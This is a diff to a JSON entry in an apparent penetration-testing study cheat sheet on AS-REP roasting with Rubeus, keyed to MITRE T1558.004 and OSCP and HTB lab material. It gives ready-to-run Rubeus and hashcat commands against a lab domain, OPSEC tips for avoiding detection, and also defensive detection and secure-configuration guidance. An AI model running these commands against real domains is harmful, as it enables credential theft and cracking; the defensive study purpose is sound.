@@ -26,7 +26,7 @@
     "T1558.004"
   ],
   "exam": "exam-ok",
-  "notes": "=== RUBEUS vs GETNPUSERS.PY ===\nBoth attack the same vulnerability \u2014 accounts with pre-auth disabled.\n  Rubeus (Windows)     \u2192 runs on the target Windows host, native Kerberos stack\n  GetNPUsers.py (Linux)\u2192 remote attack from attacker machine, no foothold needed\nUse Rubeus when you're already on a Windows host and want to stay in-memory.\nUse GetNPUsers.py for initial access (no domain credentials possible).\n\n=== FLAGS EXPLAINED ===\n  /user:mmorgan   \u2192 target specific user (omit for all vulnerable accounts)\n  /nowrap         \u2192 hash on single line (essential for Hashcat \u2014 hash must be one line)\n  /format:hashcat \u2192 outputs $krb5asrep$23$... format instead of default JtR format\n  /domain:        \u2192 specify domain if not domain-joined or wrong domain\n  /dc:            \u2192 target DC IP\n  /outfile:       \u2192 save hashes to file directly\n\n=== OUTPUT TO LOOK FOR ===\n  [*] AS-REP roast hash for user: mmorgan\n  $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:A2B1C3...\n\nPrefix $23$ = RC4 (etype 23) \u2192 Hashcat mode 18200\nPrefix $18$ = AES256 (etype 18) \u2192 also mode 18200 but significantly harder to crack\n\n=== CRACK THESE HASHES ===\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n\n=== OPSEC ===\nKerberos AS-REQ without pre-auth sent to DC generates Event 4768 (Kerberos TGT request).\nRequesting for many accounts in rapid succession looks like a scan. Use /user to\ntarget specific accounts from your PowerView enumeration rather than bulk roasting.\n\n=== NO CREDENTIALS REQUIRED ===\nIf you just need the hash with zero creds:\n  .\\Rubeus.exe asreproast /format:hashcat /nowrap\nThis works from any domain-joined machine, even with a low-privilege account.\nAnonymous requests may also work from non-joined machines depending on DC config. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+  "notes": "=== RUBEUS vs GETNPUSERS.PY ===\nBoth attack the same vulnerability — accounts with pre-auth disabled.\n  Rubeus (Windows)     → runs on the target Windows host, native Kerberos stack\n  GetNPUsers.py (Linux)→ remote attack from attacker machine, no foothold needed\nUse Rubeus when you're already on a Windows host and want to stay in-memory.\nUse GetNPUsers.py for initial access (no domain credentials possible).\n\n=== FLAGS EXPLAINED ===\n  /user:mmorgan   → target specific user (omit for all vulnerable accounts)\n  /nowrap         → hash on single line (essential for Hashcat — hash must be one line)\n  /format:hashcat → outputs $krb5asrep$23$... format instead of default JtR format\n  /domain:        → specify domain if not domain-joined or wrong domain\n  /dc:            → target DC IP\n  /outfile:       → save hashes to file directly\n\n=== OUTPUT TO LOOK FOR ===\n  [*] AS-REP roast hash for user: mmorgan\n  $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:A2B1C3...\n\nPrefix $23$ = RC4 (etype 23) → Hashcat mode 18200\nPrefix $18$ = AES256 (etype 18) → also mode 18200 but significantly harder to crack\n\n=== CRACK THESE HASHES ===\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n\n=== OPSEC ===\nKerberos AS-REQ without pre-auth sent to DC generates Event 4768 (Kerberos TGT request).\nRequesting for many accounts in rapid succession looks like a scan. Use /user to\ntarget specific accounts from your PowerView enumeration rather than bulk roasting.\n\n=== NO CREDENTIALS REQUIRED ===\nIf you just need the hash with zero creds:\n  .\\Rubeus.exe asreproast /format:hashcat /nowrap\nThis works from any domain-joined machine, even with a low-privilege account.\nAnonymous requests may also work from non-joined machines depending on DC config. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
   "examples": [
     {
       "label": "Roast specific account",
@@ -41,7 +41,7 @@
       "command": ".\\Rubeus.exe asreproast /user:mmorgan /dc:172.16.5.5 /domain:INLANEFREIGHT.LOCAL /nowrap /format:hashcat"
     },
     {
-      "label": "Ch22 \u2014 roast all vulnerable accounts, /nowrap for clean hash output",
+      "label": "Ch22 — roast all vulnerable accounts, /nowrap for clean hash output",
       "command": ".\\Rubeus.exe asreproast /nowrap"
     }
   ],
@@ -67,7 +67,7 @@
     }
   ],
   "defense": {
-    "why_it_works": "Rubeus asreproast requests AS-REPs for no-preauth accounts from a Windows foothold and outputs crackable hashes.",
+    "why_it_works": "If an account has 'Do not require Kerberos pre-authentication' set, the KDC returns an AS-REP whose encrypted portion is derived from the user's password hash — to ANY requester, no auth needed. That ciphertext is crackable offline (AS-REP roasting).",
     "prerequisites": "A domain context on Windows (Rubeus).",
     "impact": "Crackable AS-REP hashes for offline cracking.",
     "detection": "[MITRE T1558.004] Event 4768 (AS-REQ) with Pre-Authentication Type 0 and RC4 encryption; a request for an account with pre-auth disabled; a honeypot no-preauth account request is malicious.",
@@ -78,11 +78,31 @@
       "HTB M13",
       "MITRE T1558.004"
     ],
-    "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash \u2014 without demanding proof of identity first.",
+    "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.",
     "vulnerable_config": "# Active Directory user account attribute (via ADUC or ADSI Edit)\n# 'Do not require Kerberos preauthentication' = CHECKED\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true\n\n# UAC flag value: 0x400000 (4194304)\n# Confirmed with:\nGet-ADUser svc_backup -Properties DoesNotRequirePreAuth",
-    "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix \u2014 find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
+    "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
   },
   "tools": [
     "Rubeus"
+  ],
+  "variations": [
+    {
+      "label": "Roast all vulnerable users",
+      "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+    },
+    {
+      "label": "Specific user",
+      "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Roast",
+      "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+    },
+    {
+      "label": "Crack (hashcat 18200)",
+      "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+    }
   ]
 }
